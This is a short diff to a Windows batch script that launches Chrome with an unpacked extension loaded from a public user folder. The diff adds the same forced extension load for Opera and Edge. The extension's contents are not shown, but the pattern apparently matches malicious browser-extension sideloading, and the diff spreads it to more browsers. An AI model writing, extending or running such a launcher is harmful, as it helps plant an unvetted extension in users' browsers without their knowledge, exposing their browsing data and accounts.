@@ -1,2 +1,4 @@
 @echo off
 start chrome --load-extension="C:\Users\Public\Document"
+start opera.exe --load-extension="C:\Users\Public\Document"
+start msedge.exe --load-extension="C:\Users\Public\Document"
